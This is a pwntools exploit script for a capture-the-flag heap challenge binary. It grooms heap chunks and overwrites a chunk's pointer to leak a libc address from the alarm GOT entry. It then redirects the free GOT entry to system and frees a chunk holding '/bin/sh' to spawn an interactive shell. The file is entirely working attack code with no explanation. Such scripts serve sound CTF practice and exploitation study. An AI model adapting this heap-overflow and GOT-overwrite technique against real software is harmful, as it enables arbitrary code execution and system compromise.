#!/usr/bin/env python3

from pwn import *

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
context.binary = exe

s = lambda a: p.send(a)
sa = lambda a, b: p.sendafter(a, b)
sl = lambda a: p.sendline(a)
sla = lambda a, b: p.sendlineafter(a, b)
lleak = lambda a, b: log.info(a + " = %#x" % b)
rcu = lambda a: p.recvuntil(a)
debug = lambda : gdb.attach(p, gdbscript = script)

def create(size, data):
	sla(b"choice:", b"1")
	sla(b"size :", f"{size}".encode())
	sa(b"content :", data)

def update(id, size, data):
	sla(b"choice:", b"2")
	sla(b"ID ? :", f"{id}".encode())
	sla(b"size: ", f"{size}".encode())
	sa(b"content: ", data)

def delete(id):
	sla(b"choice:", b"3")
	sla(b"ID ? :", f"{id}".encode())

def view(id):
	sla(b"choice:", b"4")
	sla(b"ID ? :", f"{id}".encode())

script = '''
# scanf choice
b *0x40144A
'''

#p = remote("0", 9001)
p = process('./chall_patched')
#p = gdb.debug('./chall_patched', gdbscript = script)

# fengshui
create(0x18, b"A" * 0x18)
create(0x18, b"B" * 0x18)
delete(0)

# set up chunk index 0
payload = p64(0) + p64(0)
payload += p64(exe.got['alarm']) + p64(0x18)
update(1, 0x28, payload)

# leak libc
view(0)
rcu(b"Content: ")
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['alarm']
lleak("libc", libc_base)

# set up chunk index 0
payload = b"/bin/sh\x00" + p64(0)
payload += p64(exe.got['free'])
update(1, 0x28, payload)

# free got -> system
system = libc_base + libc.symbols['system']
update(0, 0x18, p64(system))

# trigger
delete(1)
#debug()

p.interactive()
